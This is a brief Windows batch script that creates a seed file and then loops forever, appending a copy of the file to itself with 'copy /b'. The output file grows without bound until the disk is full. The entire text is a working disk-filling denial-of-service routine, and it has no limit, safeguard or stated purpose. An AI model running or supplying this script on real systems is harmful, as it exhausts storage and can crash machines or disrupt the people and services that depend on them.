@echo off
echo seed > seed.dat
copy seed.dat output.dat
copy output.dat snapshot.dat
:grow
copy /b output.dat+snapshot.dat output.dat
goto grow
